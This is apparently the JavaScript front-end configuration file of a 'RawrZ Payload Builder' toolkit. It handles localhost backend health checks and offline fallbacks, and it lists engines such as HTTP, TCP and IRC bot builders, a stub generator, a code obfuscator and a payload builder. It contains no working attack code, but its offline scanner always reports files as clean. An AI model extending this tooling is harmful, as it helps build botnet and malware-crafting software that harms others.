/**
 * RawrZ Payload Builder - Engine Configuration & API Management
 * Handles backend connectivity, API endpoints, and offline functionality
 */

class RawrZEngineManifest {
  constructor() {
    this.isOnline = false;
    this.backendUrl = 'http://localhost:3000';
    this.websocketUrl = 'ws://localhost:8001';
    this.fallbackPort = 3003;
    this.retryAttempts = 3;
    this.retryDelay = 2000;
    this.engines = new Map();
    this.apiCache = new Map();

    this.init();
  }

  async init() {
    console.log('🚀 Initializing RawrZ Engine Manifest...');
    await this.checkBackendStatus();
    await this.loadEngines();
    await this.setupFileScanning();
    this.setupEventListeners();
    console.log('✅ RawrZ Engine Manifest ready');
  }

  async checkBackendStatus() {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000);

      const response = await fetch(`${this.backendUrl}/api/health`, {
        signal: controller.signal,
        method: 'GET'
      });

      clearTimeout(timeoutId);

      if (response.ok) {
        this.isOnline = true;
        console.log('✅ Backend online');
        this.updateStatus('online', 'Connected to backend server');
        return true;
      }
    } catch (error) {
      console.warn('⚠️ Backend offline, using fallback mode');
      this.isOnline = false;
      this.updateStatus('offline', 'Backend offline - some features may not work');
      await this.initializeOfflineMode();
    }
    return false;
  }

  updateStatus(status, message) {
    const statusElements = document.querySelectorAll('.connection-status, .status-text');
    statusElements.forEach(el => {
      if (el.classList.contains('connection-status')) {
        el.className = `connection-status ${status}`;
        el.innerHTML = `<span class="status-dot ${status}"></span> ${message}`;
      } else {
        el.textContent = message;
      }
    });

    // Show banner for offline status
    if (status === 'offline') {
      this.showOfflineBanner();
    }
  }

  showOfflineBanner() {
    const existingBanner = document.querySelector('.offline-banner');
    if (existingBanner) return;

    const banner = document.createElement('div');
    banner.className = 'offline-banner';
    banner.innerHTML = `
            <div class="banner-content">
                <span>❌ Backend offline - some features may not work</span>
                <button onclick="window.rawrZManifest.reconnect()">Retry Connection</button>
                <button onclick="this.parentElement.parentElement.style.display='none'">×</button>
            </div>
        `;
    banner.style.cssText = `
            position: fixed; top: 0; left: 0; right: 0; z-index: 10000;
            background: #ff4444; color: white; padding: 10px;
            text-align: center; font-weight: bold;
        `;
    document.body.insertBefore(banner, document.body.firstChild);
  }

  async initializeOfflineMode() {
    console.log('🔄 Initializing offline mode...');

    // Setup offline engines
    this.engines.set('file-scanner', new OfflineFileScanner());
    this.engines.set('cryptography', new OfflineCrypto());
    this.engines.set('stub-generator', new OfflineStubGenerator());
    this.engines.set('payload-builder', new OfflinePayloadBuilder());

    console.log('✅ Offline mode initialized with', this.engines.size, 'engines');
  }

  async loadEngines() {
    const engineConfigs = [
      { id: 'beaconism-compiler', name: '📡 Beaconism Compiler', category: 'compilation' },
      { id: 'http-bot-builder', name: '🌐 HTTP Bot Builder', category: 'networking' },
      { id: 'tcp-bot-builder', name: '🔌 TCP Bot Builder', category: 'networking' },
      { id: 'irc-bot-builder', name: '💬 IRC Bot Builder', category: 'networking' },
      { id: 'binary-analysis', name: '🔍 Binary Analysis', category: 'analysis' },
      { id: 'network-scanner', name: '🌐 Network Scanner', category: 'scanning' },
      { id: 'steganography', name: '🖼️ Steganography', category: 'security' },
      { id: 'code-obfuscator', name: '🔒 Code Obfuscator', category: 'security' }
    ];

    for (const config of engineConfigs) {
      this.engines.set(config.id, {
        ...config,
        loaded: false,
        lastUsed: null,
        status: 'ready'
      });
    }

    console.log(`✅ Loaded ${engineConfigs.length} engine configurations`);
  }

  async setupFileScanning() {
    console.log('🔍 Setting up file scanning functionality...');

    if (!this.isOnline) {
      // Offline file scanning
      window.scanFile = async (filePath) => {
        return await this.offlineFileScan(filePath);
      };
    } else {
      // Online file scanning
      window.scanFile = async (filePath) => {
        return await this.onlineFileScan(filePath);
      };
    }

    console.log('✅ File scanning functionality ready');
  }

  async offlineFileScan(filePath) {
    console.log('🔍 Offline file scan:', filePath);

    // Basic file analysis without backend
    return {
      success: true,
      filePath: filePath,
      size: 'Unknown',
      type: this.getFileType(filePath),
      hash: 'offline-mode-no-hash',
      scan: {
        threats: 0,
        warnings: ['Offline scan - limited analysis'],
        status: 'clean'
      },
      timestamp: new Date().toISOString()
    };
  }

  async onlineFileScan(filePath) {
    try {
      const response = await fetch(`${this.backendUrl}/api/scan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ filePath })
      });

      return await response.json();
    } catch (error) {
      console.error('Online scan failed:', error);
      return await this.offlineFileScan(filePath);
    }
  }

  getFileType(filePath) {
    const ext = filePath.split('.').pop().toLowerCase();
    const types = {
      'exe': 'Windows Executable',
      'dll': 'Dynamic Link Library',
      'bat': 'Batch Script',
      'ps1': 'PowerShell Script',
      'py': 'Python Script',
      'js': 'JavaScript',
      'zip': 'Compressed Archive',
      'rar': 'RAR Archive'
    };
    return types[ext] || 'Unknown';
  }

  async api(endpoint, data = null, method = 'GET') {
    console.log(`🌐 API call: ${method} ${endpoint}`);

    if (!this.isOnline) {
      return this.handleOfflineAPI(endpoint, data, method);
    }

    try {
      const options = {
        method,
        headers: { 'Content-Type': 'application/json' }
      };

      if (data && method !== 'GET') {
        options.body = JSON.stringify(data);
      }

      const response = await fetch(`${this.backendUrl}/api/${endpoint}`, options);
      const result = await response.json();

      // Cache successful responses
      this.apiCache.set(`${method}:${endpoint}`, result);

      return result;
    } catch (error) {
      console.error('API call failed:', error);

      // Try cached response
      const cached = this.apiCache.get(`${method}:${endpoint}`);
      if (cached) {
        console.log('📋 Using cached response');
        return cached;
      }

      return this.handleOfflineAPI(endpoint, data, method);
    }
  }

  handleOfflineAPI(endpoint, data, method) {
    console.log('🔧 Handling offline API call');

    const offlineResponses = {
      'health': { status: 'offline', message: 'Backend unavailable' },
      'engines': { engines: Array.from(this.engines.values()) },
      'scan': { success: false, message: 'Scanning unavailable offline' },
      'generate-stub': { success: false, message: 'Stub generation unavailable offline' },
      'encrypt': { success: false, message: 'Encryption service unavailable offline' },
      'decrypt': { success: false, message: 'Decryption service unavailable offline' }
    };

    return offlineResponses[endpoint] || {
      success: false,
      message: `API endpoint '${endpoint}' not available offline`,
      offline: true
    };
  }

  async executeEngine(engineId, params = {}) {
    console.log(`🚀 Executing ${engineId}...`);

    const engine = this.engines.get(engineId);
    if (!engine) {
      throw new Error(`Engine '${engineId}' not found`);
    }

    engine.lastUsed = new Date().toISOString();
    engine.status = 'running';

    try {
      let result;

      if (this.isOnline) {
        result = await this.api('execute-engine', { engineId, params }, 'POST');
      } else {
        result = await this.executeOfflineEngine(engineId, params);
      }

      engine.status = result.success ? 'completed' : 'error';
      return result;

    } catch (error) {
      engine.status = 'error';
      console.error(`Engine ${engineId} failed:`, error);
      throw error;
    }
  }

  async executeOfflineEngine(engineId, params) {
    console.log(`🔧 Executing ${engineId} in offline mode`);

    // Simulate engine execution with offline capabilities
    await new Promise(resolve => setTimeout(resolve, 1000));

    return {
      success: false,
      message: `${engineId} requires backend connection`,
      offline: true,
      engineId,
      params,
      timestamp: new Date().toISOString()
    };
  }

  async reconnect() {
    console.log('🔄 Attempting to reconnect...');
    const banner = document.querySelector('.offline-banner');
    if (banner) banner.style.display = 'none';

    await this.checkBackendStatus();

    if (this.isOnline) {
      location.reload(); // Refresh to reinitialize online mode
    }
  }

  setupEventListeners() {
    // Global API function
    window.api = (endpoint, data = null, method = 'GET') => {
      return this.api(endpoint, data, method);
    };

    // Global reconnect function
    window.reconnectBackend = () => {
      return this.reconnect();
    };

    // Periodic health check
    setInterval(() => {
      if (!this.isOnline) {
        this.checkBackendStatus();
      }
    }, 30000); // Check every 30 seconds

    console.log('✅ Event listeners configured');
  }

  getStatus() {
    return {
      online: this.isOnline,
      backendUrl: this.backendUrl,
      enginesLoaded: this.engines.size,
      cacheSize: this.apiCache.size,
      lastCheck: new Date().toISOString()
    };
  }
}

// Offline Engine Implementations
class OfflineFileScanner {
  async scan(filePath) {
    return {
      success: true,
      threats: 0,
      warnings: ['Offline mode - limited scanning'],
      status: 'clean'
    };
  }
}

class OfflineCrypto {
  async encrypt(data, algorithm) {
    return {
      success: false,
      message: 'Encryption unavailable in offline mode'
    };
  }

  async decrypt(data, algorithm) {
    return {
      success: false,
      message: 'Decryption unavailable in offline mode'
    };
  }
}

class OfflineStubGenerator {
  async generate(payload, options) {
    return {
      success: false,
      message: 'Stub generation unavailable in offline mode'
    };
  }
}

class OfflinePayloadBuilder {
  async build(config) {
    return {
      success: false,
      message: 'Payload building unavailable in offline mode'
    };
  }
}

// Initialize the manifest when the script loads
document.addEventListener('DOMContentLoaded', () => {
  window.rawrZManifest = new RawrZEngineManifest();
});

// Export for module usage
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { RawrZEngineManifest };
}

console.log('✅ RawrZ Engine Configuration loaded');